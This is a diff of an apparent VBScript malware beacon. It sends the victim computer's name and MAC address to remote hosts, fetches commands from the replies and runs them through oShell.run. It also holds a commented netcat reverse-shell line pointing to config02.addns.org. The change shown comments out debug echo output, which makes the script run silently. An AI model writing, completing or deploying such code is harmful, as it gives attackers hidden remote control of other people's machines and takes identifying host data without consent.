@@ -35,12 +35,12 @@ dim arr
   for each x in a
       'msgbox x
       'nc64.exe -w 10 -e cmd.exe config02.addns.org 4002
-      Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
+      'Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
       xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
       xmlhttp.send
       strOutput = xmlhttp.responseText
       arr=Split(strOutput,"||")
-      Wscript.Echo strOutput
+      'Wscript.Echo strOutput
       if (right(arr(7),1)=1) then
         oShell.run right(arr(8),len(arr(8))-4)
         xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac&"&exec=0", false
